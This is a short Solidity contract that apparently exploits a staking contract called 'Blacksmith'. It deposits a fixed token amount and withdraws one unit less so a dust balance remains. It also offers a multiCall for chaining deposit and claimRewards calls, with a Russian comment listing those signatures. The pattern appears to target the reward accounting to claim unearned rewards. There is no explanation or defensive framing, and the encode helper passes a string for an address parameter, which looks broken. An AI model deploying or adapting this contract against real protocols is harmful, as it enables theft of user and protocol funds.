// SPDX-License-Identifier: None
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IBlacksmith{
    function deposit(address _lpToken, uint256 _amount) external;
    function withdraw(address _lpToken, uint256 _amount) external;
    function claimRewards(address _lpToken) external;
}

contract Deployer{

    address public target;
    address public lpToken;
    uint256 constant public amount = 500000000000000000000;


    constructor(address _target, address _lpToken) {
        target = _target;
        lpToken = _lpToken;
    }

    function pay() public{
        IERC20(lpToken).approve(target,amount);
        IBlacksmith(target).deposit(lpToken,amount);
    }

    function repay() public{
        uint256 newamount = amount - 1;
        IBlacksmith(target).withdraw(lpToken,newamount);
    }

    function multiCall(address[] calldata targets, bytes[] calldata data) public{
        require(targets.length == data.length);
        IERC20(lpToken).approve(target,amount);

        for(uint i; i<targets.length; i++){
            (bool success,) = targets[i].call(data[i]);
            require(success, "tx failed");
        }
    }

    //передать тип данных => deposit(address,uint256) claimRewards(address)
    function encode(string calldata _func, string calldata _arg) public pure returns (bytes memory) {
        return abi.encodeWithSignature(_func, _arg);
    }

}
